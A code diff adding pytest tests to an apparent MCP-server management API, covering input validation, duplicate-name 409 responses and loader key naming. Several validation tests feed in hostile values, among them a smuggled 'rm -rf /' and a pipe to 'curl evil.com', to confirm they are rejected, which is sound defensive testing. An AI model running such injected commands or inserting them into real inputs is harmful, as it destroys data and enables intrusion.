@@ -725,6 +725,7 @@ def mock_mcp_repo_p25() -> object:
     repo._make_server = _make_server
     repo.create = AsyncMock(side_effect=lambda s: s)
     repo.get_active_by_workspace = AsyncMock(return_value=[])
+    repo.get_by_display_name = AsyncMock(return_value=None)
     repo.get_filtered = AsyncMock(return_value=[])
     repo.get_by_workspace_and_id = AsyncMock(return_value=None)
     repo.update = AsyncMock(side_effect=lambda s: s)
@@ -1454,4 +1455,399 @@ async def test_soft_deleted_server_not_in_filtered_list(
     items = list_resp.json()["items"]
     ids = [item["id"] for item in items]
     assert fake_deleted_id not in ids
+
+
+# ---------------------------------------------------------------------------
+# WorkspaceMcpServerUpdate — url_or_command validation (SEC-H3 parity)
+# ---------------------------------------------------------------------------
+
+
+def test_update_schema_rejects_empty_url_or_command() -> None:
+    """PATCH body with empty url_or_command must be rejected."""
+    import pytest
+    from pydantic import ValidationError
+
+    from pilot_space.api.v1.routers._mcp_server_schemas import WorkspaceMcpServerUpdate
+
+    with pytest.raises(ValidationError, match="must not be empty"):
+        WorkspaceMcpServerUpdate(url_or_command="")
+
+
+def test_update_schema_rejects_whitespace_url_or_command() -> None:
+    """PATCH body with whitespace-only url_or_command must be rejected."""
+    import pytest
+    from pydantic import ValidationError
+
+    from pilot_space.api.v1.routers._mcp_server_schemas import WorkspaceMcpServerUpdate
+
+    with pytest.raises(ValidationError, match="must not be empty"):
+        WorkspaceMcpServerUpdate(url_or_command="   ")
+
+
+def test_update_schema_rejects_http_url_for_remote_type() -> None:
+    """PATCH with server_type=REMOTE and HTTP URL must be rejected (SSRF)."""
+    import pytest
+    from pydantic import ValidationError
+
+    from pilot_space.api.v1.routers._mcp_server_schemas import WorkspaceMcpServerUpdate
+    from pilot_space.infrastructure.database.models.workspace_mcp_server import McpServerType
+
+    with pytest.raises(ValidationError, match="HTTPS"):
+        WorkspaceMcpServerUpdate(
+            server_type=McpServerType.REMOTE,
+            url_or_command="http://evil.example.com/mcp",
+        )
+
+
+def test_update_schema_rejects_command_injection_for_npx() -> None:
+    """PATCH with server_type=COMMAND and shell metacharacter must be rejected."""
+    import pytest
+    from pydantic import ValidationError
+
+    from pilot_space.api.v1.routers._mcp_server_schemas import WorkspaceMcpServerUpdate
+    from pilot_space.infrastructure.database.models.workspace_mcp_server import McpServerType
+
+    with pytest.raises(ValidationError, match="metacharacters"):
+        WorkspaceMcpServerUpdate(
+            server_type=McpServerType.COMMAND,
+            url_or_command="@modelcontextprotocol/server-github; rm -rf /",
+        )
+
+
+def test_update_schema_rejects_command_injection_for_uvx() -> None:
+    """PATCH with server_type=COMMAND (legacy UVX) and shell metacharacter must be rejected."""
+    import pytest
+    from pydantic import ValidationError
+
+    from pilot_space.api.v1.routers._mcp_server_schemas import WorkspaceMcpServerUpdate
+    from pilot_space.infrastructure.database.models.workspace_mcp_server import McpServerType
+
+    with pytest.raises(ValidationError, match="metacharacters"):
+        WorkspaceMcpServerUpdate(
+            server_type=McpServerType.COMMAND,
+            url_or_command="mcp-server-fetch | curl evil.com",
+        )
+
+
+def test_update_schema_accepts_valid_https_url_for_remote() -> None:
+    """PATCH with server_type=REMOTE and valid HTTPS URL passes schema validation."""
+    from unittest.mock import patch
+
+    from pilot_space.api.v1.routers._mcp_server_schemas import WorkspaceMcpServerUpdate
+    from pilot_space.infrastructure.database.models.workspace_mcp_server import McpServerType
+
+    # Patch getaddrinfo to avoid real DNS in unit tests
+    with patch("socket.getaddrinfo", return_value=[]):
+        body = WorkspaceMcpServerUpdate(
+            server_type=McpServerType.REMOTE,
+            url_or_command="https://api.example.com/mcp",
+        )
+    assert body.url_or_command == "https://api.example.com/mcp"
+
+
+def test_update_schema_accepts_valid_npx_command() -> None:
+    """PATCH with server_type=NPX and clean command passes schema validation."""
+    from pilot_space.api.v1.routers._mcp_server_schemas import WorkspaceMcpServerUpdate
+    from pilot_space.infrastructure.database.models.workspace_mcp_server import McpServerType
+
+    body = WorkspaceMcpServerUpdate(
+        server_type=McpServerType.NPX,
+        url_or_command="@modelcontextprotocol/server-github",
+    )
+    assert body.url_or_command == "@modelcontextprotocol/server-github"
+
+
+def test_update_schema_no_validation_when_url_or_command_omitted() -> None:
+    """PATCH body without url_or_command skips url_or_command validation entirely."""
+    from pilot_space.api.v1.routers._mcp_server_schemas import WorkspaceMcpServerUpdate
+    from pilot_space.infrastructure.database.models.workspace_mcp_server import McpServerType
+
+    # Only changing server_type — url_or_command not in body, so model_validator
+    # leaves url_or_command=None; cross-field check happens in the route handler.
+    body = WorkspaceMcpServerUpdate(server_type=McpServerType.NPX)
+    assert body.url_or_command is None
+    assert body.server_type == McpServerType.NPX
+
+
+# ---------------------------------------------------------------------------
+# Duplicate display_name — 409 on POST / PATCH
+# ---------------------------------------------------------------------------
+
+
+def test_post_duplicate_display_name_returns_409(
+    mock_workspace_p25: object,
+    mock_mcp_repo_p25: object,
+) -> None:
+    """POST with a display_name already used by an active server returns 409."""
+    import asyncio
+    from unittest.mock import AsyncMock, MagicMock, patch
+
+    from httpx import ASGITransport, AsyncClient
+
+    from pilot_space.dependencies.auth import get_current_user, get_session
+    from pilot_space.infrastructure.auth import TokenPayload
+    from pilot_space.infrastructure.database.models.workspace_mcp_server import (
+        WorkspaceMcpServer,
+    )
+    from pilot_space.main import app
+
+    workspace = mock_workspace_p25
+    repo = mock_mcp_repo_p25
+
+    # Simulate an existing server with the same name
+    existing = MagicMock(spec=WorkspaceMcpServer)
+    existing.id = uuid4()
+    repo.get_by_display_name = AsyncMock(return_value=existing)
+
+    mock_payload = MagicMock(spec=TokenPayload)
+    mock_payload.sub = "test-user-id"
+    mock_payload.user_id = workspace.id  # type: ignore[attr-defined]
+
+    async def _session():  # type: ignore[return]
+        yield MagicMock()
+
+    app.dependency_overrides[get_current_user] = lambda: mock_payload
+    app.dependency_overrides[get_session] = _session
+
+    try:
+        with (
+            patch(_ADMIN_WORKSPACE_PATH, new=AsyncMock(return_value=workspace)),
+            patch(_SET_RLS_PATH, new=AsyncMock()),
+            patch(_MCP_REPO_PATH, return_value=repo),
+        ):
+
+            async def _run() -> int:
+                async with AsyncClient(
+                    transport=ASGITransport(app=app),
+                    base_url="http://test",
+                    headers={"Authorization": "Bearer test-token"},
+                ) as client:
+                    resp = await client.post(
+                        f"/api/v1/workspaces/{workspace.id}/mcp-servers",  # type: ignore[attr-defined]
+                        json={
+                            "display_name": "Duplicate Server",
+                            "url_or_command": "https://mcp.example.com/sse",
+                            "server_type": "remote",
+                        },
+                    )
+                    return resp.status_code
+
+            status_code = asyncio.get_event_loop().run_until_complete(_run())
+    finally:
+        app.dependency_overrides.pop(get_current_user, None)
+        app.dependency_overrides.pop(get_session, None)
+
+    assert status_code == 409
+
+
+def test_patch_rename_to_existing_name_returns_409(
+    mock_workspace_p25: object,
+    mock_mcp_repo_p25: object,
+) -> None:
+    """PATCH renaming to an already-taken display_name returns 409."""
+    import asyncio
+    from datetime import UTC, datetime
+    from unittest.mock import AsyncMock, MagicMock, patch
+
+    from httpx import ASGITransport, AsyncClient
+
+    from pilot_space.dependencies.auth import get_current_user, get_session
+    from pilot_space.infrastructure.auth import TokenPayload
+    from pilot_space.infrastructure.database.models.workspace_mcp_server import (
+        McpAuthType,
+        McpServerType,
+        McpStatus,
+        McpTransport,
+        WorkspaceMcpServer,
+    )
+    from pilot_space.main import app
+
+    workspace = mock_workspace_p25
+    repo = mock_mcp_repo_p25
+    server_id = uuid4()
+
+    # The server being patched
+    existing_server = MagicMock(spec=WorkspaceMcpServer)
+    existing_server.id = server_id
+    existing_server.workspace_id = workspace.id  # type: ignore[attr-defined]
+    existing_server.display_name = "Original Name"
+    existing_server.server_type = McpServerType.REMOTE
+    existing_server.transport = McpTransport.SSE
+    existing_server.url_or_command = "https://original.example.com/sse"
+    existing_server.url = "https://original.example.com/sse"
+    existing_server.command_args = None
+    existing_server.is_enabled = True
+    existing_server.auth_type = McpAuthType.NONE
+    existing_server.auth_token_encrypted = None
+    existing_server.headers_encrypted = None
+    existing_server.headers_json = None
+    existing_server.env_vars_encrypted = None
+    existing_server.oauth_client_id = None
+    existing_server.oauth_auth_url = None
+    existing_server.oauth_token_url = None
+    existing_server.oauth_scopes = None
+    existing_server.last_status = McpStatus.ENABLED
+    existing_server.last_status_checked_at = None
+    existing_server.created_at = datetime.now(UTC)
+
+    repo.get_by_workspace_and_id = AsyncMock(return_value=existing_server)
+
+    # Another active server already uses the target name
+    conflict_server = MagicMock(spec=WorkspaceMcpServer)
+    conflict_server.id = uuid4()
+    repo.get_by_display_name = AsyncMock(return_value=conflict_server)
+
+    mock_payload = MagicMock(spec=TokenPayload)
+    mock_payload.sub = "test-user-id"
+    mock_payload.user_id = workspace.id  # type: ignore[attr-defined]
+
+    async def _session():  # type: ignore[return]
+        yield MagicMock()
+
+    app.dependency_overrides[get_current_user] = lambda: mock_payload
+    app.dependency_overrides[get_session] = _session
+
+    try:
+        with (
+            patch(_ADMIN_WORKSPACE_PATH, new=AsyncMock(return_value=workspace)),
+            patch(_SET_RLS_PATH, new=AsyncMock()),
+            patch(_MCP_REPO_PATH, return_value=repo),
+        ):
+
+            async def _run() -> int:
+                async with AsyncClient(
+                    transport=ASGITransport(app=app),
+                    base_url="http://test",
+                    headers={"Authorization": "Bearer test-token"},
+                ) as client:
+                    resp = await client.patch(
+                        f"/api/v1/workspaces/{workspace.id}/mcp-servers/{server_id}",  # type: ignore[attr-defined]
+                        json={"display_name": "Taken Name"},
+                    )
+                    return resp.status_code
+
+            status_code = asyncio.get_event_loop().run_until_complete(_run())
+    finally:
+        app.dependency_overrides.pop(get_current_user, None)
+        app.dependency_overrides.pop(get_session, None)
+
+    assert status_code == 409
+
+
+# ---------------------------------------------------------------------------
+# load_workspace_mcp_servers — key format includes UUID suffix
+# ---------------------------------------------------------------------------
+
+_LOADER_REPO_PATH = (
+    "pilot_space.infrastructure.database.repositories"
+    ".workspace_mcp_server_repository.WorkspaceMcpServerRepository"
+)
+_LOADER_BUILD_PATH = (
+    "pilot_space.ai.agents.pilotspace_stream_utils._build_server_config"
+)
+_LOADER_DECRYPT_PATH = (
+    "pilot_space.infrastructure.encryption.decrypt_api_key"
+)
+
+
+def test_loader_key_includes_uuid_suffix() -> None:
+    """Keys from load_workspace_mcp_servers must be WORKSPACE_{NAME}_{SHORT_ID}."""
+    import asyncio
+    from unittest.mock import AsyncMock, MagicMock, patch
+    from uuid import UUID
+
+    from pilot_space.ai.agents.pilotspace_stream_utils import load_workspace_mcp_servers
+    from pilot_space.infrastructure.database.models.workspace_mcp_server import (
+        McpServerType,
+        McpTransport,
+        WorkspaceMcpServer,
+    )
+
+    server_id = UUID("a1b2c3d4-e5f6-7890-abcd-ef1234567890")
+
+    server = MagicMock(spec=WorkspaceMcpServer)
+    server.id = server_id
+    server.display_name = "My Server"
+    server.server_type = McpServerType.REMOTE
+    server.transport = McpTransport.SSE
+    server.url_or_command = "https://mcp.example.com/sse"
+    server.url = "https://mcp.example.com/sse"
+    server.auth_type = MagicMock()
+    server.auth_token_encrypted = None
+    server.headers_encrypted = None
+    server.headers_json = None
+    server.env_vars_encrypted = None
+
+    repo_mock = AsyncMock()
+    repo_mock.get_active_by_workspace = AsyncMock(return_value=[server])
+
+    workspace_id = uuid4()
+    db_session = MagicMock()
+
+    with (
+        patch(_LOADER_REPO_PATH, return_value=repo_mock),
+        patch(_LOADER_BUILD_PATH, return_value=MagicMock()),
+    ):
+        result = asyncio.get_event_loop().run_until_complete(
+            load_workspace_mcp_servers(workspace_id, db_session)
+        )
+
+    # Short ID is first 8 hex chars of a1b2c3d4-... uppercased = "A1B2C3D4"
+    expected_key = "WORKSPACE_MY_SERVER_A1B2C3D4"
+    assert expected_key in result, f"Expected key {expected_key!r}, got keys: {list(result)}"
+
+
+def test_loader_two_servers_get_distinct_keys() -> None:
+    """Two servers with identical normalized names each get a unique key via UUID suffix."""
+    import asyncio
+    from unittest.mock import AsyncMock, MagicMock, patch
+    from uuid import UUID
+
+    from pilot_space.ai.agents.pilotspace_stream_utils import load_workspace_mcp_servers
+    from pilot_space.infrastructure.database.models.workspace_mcp_server import (
+        McpServerType,
+        McpTransport,
+        WorkspaceMcpServer,
+    )
+
+    id_a = UUID("aaaaaaaa-0000-0000-0000-000000000001")
+    id_b = UUID("bbbbbbbb-0000-0000-0000-000000000002")
+
+    def _make(sid: UUID, name: str) -> MagicMock:
+        s = MagicMock(spec=WorkspaceMcpServer)
+        s.id = sid
+        s.display_name = name
+        s.server_type = McpServerType.REMOTE
+        s.transport = McpTransport.SSE
+        s.url_or_command = "https://mcp.example.com/sse"
+        s.url = "https://mcp.example.com/sse"
+        s.auth_type = MagicMock()
+        s.auth_token_encrypted = None
+        s.headers_encrypted = None
+        s.headers_json = None
+        s.env_vars_encrypted = None
+        return s
+
+    # "my server" and "my-server" both normalize to "MY_SERVER"
+    server_a = _make(id_a, "my server")
+    server_b = _make(id_b, "my-server")
+
+    repo_mock = AsyncMock()
+    repo_mock.get_active_by_workspace = AsyncMock(return_value=[server_a, server_b])
+
+    workspace_id = uuid4()
+    db_session = MagicMock()
+
+    with (
+        patch(_LOADER_REPO_PATH, return_value=repo_mock),
+        patch(_LOADER_BUILD_PATH, return_value=MagicMock()),
+    ):
+        result = asyncio.get_event_loop().run_until_complete(
+            load_workspace_mcp_servers(workspace_id, db_session)
+        )
+
+    assert len(result) == 2, f"Expected 2 distinct keys, got: {list(result)}"
+    assert "WORKSPACE_MY_SERVER_AAAAAAAA" in result
+    assert "WORKSPACE_MY_SERVER_BBBBBBBB" in result
+
 
